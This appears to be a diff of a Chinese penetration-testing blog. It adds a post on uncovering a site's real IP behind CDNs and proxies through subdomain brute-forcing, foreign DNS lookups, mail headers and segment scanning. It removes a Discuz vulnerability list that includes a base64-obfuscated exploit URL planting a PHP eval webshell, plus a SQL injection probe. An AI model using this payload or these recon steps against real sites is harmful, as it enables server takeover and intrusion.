@@ -321,6 +321,200 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-find-real-ip-of-a-site/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="groot">
+      <meta itemprop="description" content="运维 | 安全 | 渗透">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Securitainment.io">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                
+                <a href="/2016/05/14/2016-05-14-find-real-ip-of-a-site/" class="post-title-link" itemprop="url">查找網站真實IP</a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2016-05-14 01:25:19" itemprop="dateCreated datePublished" datetime="2016-05-14T01:25:19+08:00">2016-05-14</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2019-03-15 01:21:08" itemprop="dateModified" datetime="2019-03-15T01:21:08+08:00">2019-03-15</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+            
+              
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+            
+                <span class="post-meta-item-text">Comments: </span>
+                <a href="/2016/05/14/2016-05-14-find-real-ip-of-a-site/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-find-real-ip-of-a-site/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <a id="more"></a>
+<h1 id="查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法"><a href="#查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法" class="headerlink" title="查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法"></a>查找“CDN、负载均衡、反向代理”等大型网络真实IP地址的方法</h1><p><strong>首先，CDN、负载均衡、反向代理还分为很多层，有时查出来的是最外层的 CDN 服务器群，真实的机器是不对外开放的，类似这样的：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用户　　→　　　CDN 网络　　　→　　一台或多台真实机器 </span><br><span class="line"></span><br><span class="line">　　　　↗　　CDN Server 1　　↘</span><br><span class="line">用户　　→　　CDN Server 2　　→　　真实机器</span><br><span class="line">　　　　↘　　CDN Server N　　↗</span><br><span class="line"></span><br><span class="line">-------------------------------------------------------- </span><br><span class="line"></span><br><span class="line">用户　　→　　　CDN 网络　　　→　　一台或多台反向代理　　　→　　一台或多台真实机器 </span><br><span class="line"></span><br><span class="line">　　　　↗　　CDN Server 1　　↘</span><br><span class="line">用户　　→　　CDN Server 2　　→　　Reverse Proxy Server　　→　　真实机器</span><br><span class="line">　　　　↘　　CDN Server N　　↗</span><br></pre></td></tr></table></figure>
+<p>具体根据网络的负载需求，CDN 服务器的数量以及分级层数是不一定的。</p>
+<p>如果是这样的话，除非日一台CDN服务器看记录或者日进CDN供应商控制系统或后台，才能找到真实IP，但是那些CDN服务器配置完全一样，应该很难搞。</p>
+<p>（这些CDN服务器不止代理的这一家网站，现在都是同时代理很多家网站，这就可以解释你旁站查询出来很多不相干的网站都在同一个IP地址，这是CDN服务器供应商节省成本的一种方案，一台CDN同时代理多家网站，CDN供应商根据你支付金额的多少，决定使用多少台CDN服务器。）</p>
+<p>（这些CDN服务器一般都在高防机房，拥有很大的带宽，并且大多数CDN运营商还拥有云防火墙技术，什么叫云防火墙？即：任意一台服务器检测到DDOS攻击后，会向所有服务器通告这些攻击源IP，然后所有这些服务器都同时屏蔽这些地址，以实现整个网络屏蔽DDOS的目的，这些服务器组成了一个很强力的抗DDOS网络，这是目前对付DDOS攻击，比较有效的方案之一。）</p>
+<p>（再补充一点经验，这些CDN服务器还根据你提交的 HTTP HOST 头（也就是域名）返回不一样的系统信息，更有甚者，只要你 HTTP HOST 头不正确（不是它提供服务的域名），直接掐断连接，不返回任何数据，你就得不到任何有效信息，如果你使用“<a href="http://lcx.cc/?FoxNews=1904.html" target="_blank" rel="noopener">长安刺客 - 旁注杀手 v1.2 版 + CDN 终结者 v1.1</a>”的话，那么需要在 CDN 终结者界面勾选特殊模式，然后再刺探网络构架，有时候会有惊喜哟……）</p>
+<p><strong>还有另外一种：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">用户　　→　　多台实时同步的缓存服务器与真实机器</span><br><span class="line"></span><br><span class="line">　　　　↗　　Cache Server 1</span><br><span class="line">用户　　→　　Cache Server 2</span><br><span class="line">　　　　↘　　Cache Server N</span><br><span class="line">　　　　↘　　真实机器</span><br></pre></td></tr></table></figure>
+<p>如果是这种的话，很容易就可以找出来真实服务器的IP地址，因为他们 HTTP Banner 等信息是完全不一样的，用“长安刺客 - 旁注杀手”一眼就看出来了。</p>
+<p><strong>还有另外几种 CDN、负载均衡、反向代理 等网络构架：</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">用户　　→　　　负载均衡　　　→　　服务器群</span><br><span class="line"></span><br><span class="line">　　　　　　　　　　　　　　　↗　　Cache Server 1</span><br><span class="line">用户　　→　　Load Balance　　→　　Cache Server 2</span><br><span class="line">　　　　　　　　　　　　　　　↘　　Cache Server N</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">用户　　→　　　反向代理类服务器　　　→　　一台或多台真实机器</span><br><span class="line"></span><br><span class="line">　　　　　　　　　　　　　　　　　　　↗　　真实机器1</span><br><span class="line">用户　　→　　Reverse Proxy Server　　→　　真实机器2</span><br><span class="line">　　　　　　　　　　　　　　　　　　　↘　　真实机器N</span><br></pre></td></tr></table></figure>
+<p>再结合 xxbing 提供的方法：</p>
+<p><strong>关于探测主站真实IP，我一般先查一下分站IP，有一种情况是，主站采用了CDN，分站没有用。</strong></p>
+<p>比如 bbs.xxx.com、vip.xxx.com、pay.xxx.com 都是 111.111.111.x 段的，那么主站也很有可能是 111.111.111.x 段的。扫一下这个段的80吧。</p>
+<p>这确实是个好方法，针对国内的大站，多分玉米的很实用。但是现在很多国外站各种分域名ping出来和主站都是一个IP。</p>
+<p>可以暴力跑一下2级域名。什么 blog.xxx.com、admin.xxx.com、root.xxx.com。反正4位英文以内的。。</p>
+<p><strong>二级域名 nslookup 百度，谷歌 搜集信息</strong></p>
+<p><strong>还听说有国外vpn ping的方式</strong></p>
+<blockquote>
+<p>使用国外 vpn ping 的方法是因为，大部分CDN提供商只针对国内市场，而对国外市场几乎是不做CDN，所以有很大的几率会直接解析到真实IP。其实这个方法根本不用上国外vpn，因为你上国外vpn的ping本质，就是使用国外dns（那台vpn服务器使用的dns）查询域名而已，所以只需要：nslookup lcx.cc 国外dns，就行了，例如：nslookup lcx.cc 8.8.8.8，提示：你要找冷门国外DNS才行，像谷歌的DNS，国内用的人越来越多了，很多CDN提供商都把谷歌DNS作为国内市场之一，所以，你查到的结果会和国内差不了多少……</p>
+</blockquote>
+<p>1 历史记录(<a href="http://toolbar.netcraft.com/site_report?url=www.xxx.net" target="_blank" rel="noopener">http://toolbar.netcraft.com/site_report?url=www.xxx.net</a>)</p>
+<p>2 phpinfo </p>
+<p>3 经常用ping xxx.com代替ping <a href="http://www.xxx.com,然后ping子域,再nslookup" target="_blank" rel="noopener">www.xxx.com,然后ping子域,再nslookup</a></p>
+<p><strong>有的服务器本地自带sendmail…  注册之后，会主动发一封邮件给我们。。。 好吧。。打开邮件的源代码。。 你就能看到服务器的真实Ip了。。。有的大型互联网网站会有自己的Mailserver…应该也是处在一个网段吧？？  那个网段打开80的一个一个试。。。哈哈。。</strong></p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-pentest-browser-problems/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2459,243 +2653,6 @@ formhash=99238f2d&amp;anchor=&amp;namenew=exp&amp;templateidnew=1&amp;stylevar%5
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://5cr1pt.github.io/blog.securitainment.io/2016/05/14/2016-05-14-discuz-bug-list/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="groot">
-      <meta itemprop="description" content="运维 | 安全 | 渗透">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Securitainment.io">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2016/05/14/2016-05-14-discuz-bug-list/" class="post-title-link" itemprop="url">Discuz vuls list</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2016-05-14 00:49:23" itemprop="dateCreated datePublished" datetime="2016-05-14T00:49:23+08:00">2016-05-14</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">Edited on</span>
-                
-                <time title="Modified: 2019-07-25 14:29:49" itemprop="dateModified" datetime="2019-07-25T14:29:49+08:00">2019-07-25</time>
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-              
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-            
-                <span class="post-meta-item-text">Comments: </span>
-                <a href="/2016/05/14/2016-05-14-discuz-bug-list/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/05/14/2016-05-14-discuz-bug-list/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <a id="more"></a>
-<h1 id="Discuz-漏洞收集"><a href="#Discuz-漏洞收集" class="headerlink" title="Discuz 漏洞收集"></a>Discuz 漏洞收集</h1><pre><code>Discuz! 6.x/7.x 全局变量防御绕过漏洞  由于php5.3.x版本里php.ini的设置里request_order默认值为GP，导致Discuz! 6.x/7.x 全局变量防御绕过漏洞. 
-
-Discuz! admin\styles.inc.php get-webshell bug   由于Discuz!的admin\styles.inc.php里preg_match正则判断$newcvar变量操作不够严谨，导致执行代码漏洞. 
-
-Discuz!&lt;5.50 $onlineipmatches 未初始化漏洞     由于Discuz!&lt;5.50的common.inc.php使用preg_match()的变量$onlineipmatches 未初始化漏洞,导致可以容易构造$onlineip  
-
-Discuz! 1_modcp_editpost.tpl.php xss bug    由于Discuz!的1_modcp_editpost.tpl.php里$orig[&apos;message&apos;]未过滤,导致一个xss漏洞.   
-
-Discuz! admin\database.inc.php get-webshell bug     由于Discuz!的admin\database.inc.php里action=importzip解压zip文件时,导致可以得到webshell.   
-
-Discuz! Reset User Password Vulnerability   由于Discuz! 的 随机数使用的播种缺陷,在找会用户密码时可以暴力得到id的随机hash,从而导致容易修改用户密码的严重漏洞.   
-
-Discuz! $_DCACHE数组变量覆盖漏洞 [update 11.14]     由于Discuz! 的wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题.     
-
-Discuz! 路径信息泄露 bug  由于Discuz! cache file的数组$_DCACHE,$_CACHE等的变量名没有初始化导致路径信息泄露.  
-
-Discuz! member.php xss bug  由于Discuz!的member.php对$listgid并没有初始化导致一个严重的xss bug.  
-
-Discuz! admin\runwizard.inc.php get-webshell bug    由于Discuz!的admin\runwizard.inc.php里saverunwizardhistory()写文件操作没有限制导致执行代码漏洞.  
-
-Discuz! modcp\moderate.inc.php 数据库注射bug     由于Discuz!的modcp/moderate.inc.php里$fidadd数组变量没有初始化导致sql注射bug     
-
-Discuz! moderation.inc.php 数据库&apos;注射&apos; bug  由于Discuz!的include/moderation.inc.php存在一个&apos;二次攻击&apos;导致数据库&apos;注射&apos;的bug     
-
-Discuz! trade.php 数据库&apos;注射&apos; bug   由于Discuz!的trade.php里的$message处理不严格导致引起数据库操作错误,通过SODB-2008-06而导致xss攻击及数据库信息泄露的漏洞.    
-
-Discuz! 数据库错误信息xss bug  由于Discuz!在处理数据库的错误信息时对$GLOBALS[&apos;PHP_SELF&apos;]没有过滤,导致在让数据库出错的情况下导致xss攻击.    
-
-Discuz!4.x wap\index.php 变量覆盖漏洞     由于Discuz!的wap\index.php处理post的变量不严谨而导致变量覆盖,从而可能导致sql注射/代码执行/xss等攻击.     
-
-Discuz! cache.func.php信息泄漏的bug  由于Discuz!的\include\cache.func.php缺少访问限制导致版本及补丁消息的泄露.    
-
-Discuz! flash Crsf bug  由于Discuz!对flash跨域策略文件及上传图片文件处理不严导致可以绕过formhash及Referer的限制,导致csrf攻击.     
-
-Discuz! admincp.php xss bug     由于Discuz!的后台登陆文件$url_forward没有过滤导致一个严重的xss bug.     
-
-Discuz![flash] xss bug  由于Discuz!对上传图片文件处理不严及flash标签安全设置不严导致一个严重的xss bug.   
-
-Discuz 6.x—7.x:WAP高危漏洞,wap\index.php调用Chinese类里Convert方法在处理post数据时不当忽视对数组的处理,可使数组被覆盖为NULL.当覆盖$_DCACHE时导致导致xss sql注射 代码执行等众多严重的安全问题
-
-Discuz 7.0-7.2:后台settings.inc.php中写shell漏洞
-
-Discuz 7.1-7.2：showmessage bug,利用方式:misc.php?action=imme_binding&amp;response[result]=aa:b&amp;scriptlang[aa][b]={${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))}}
-
-Discuz 7.2:SQL注入漏洞/manyou/sources/notice.php
-
-Discuz 7.2代码执行漏洞
-
-Discuz! x1-1.5 SQL 注入 GetShell EXP 
-
-Discuz! X1-1.5 notify_credit.php 页面SQL注入漏洞 
-
-Discuz! 1.5 跨站脚本攻击漏洞 UC登陆页面存在跨站漏洞
-
-DiscuzX1.5 门户管理权限SQL注入BUG
-
-DZ-X1.5 论坛后台拿WebShell
-
-discuz x1.5&amp;discuz 7.2 后台getshell 0day
-
-DISCUZ X1.5 本地文件包含漏洞
-
-Discuz! X2:SQL注入漏洞source\module\forum\forum_attachment.php
-
-Discuz! X2:SQL注入member.php?mod=logging&amp;action=login，提交username=1+and+1=1
-
-Discuz!NT 2.x - 3.5.2 SQL注入(0day)
-
-Discuz!NT3.5.2文件编辑0Day获取Webshell
-</code></pre>
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2742,7 +2699,7 @@ Discuz!NT3.5.2文件编辑0Day获取Webshell
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">23</span>
+                    <span class="site-state-item-count">24</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
@@ -2807,7 +2764,11 @@ Discuz!NT3.5.2文件编辑0Day获取Webshell
                     
                       
                     
-                    <span class="site-state-item-count">23</span>
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">25</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
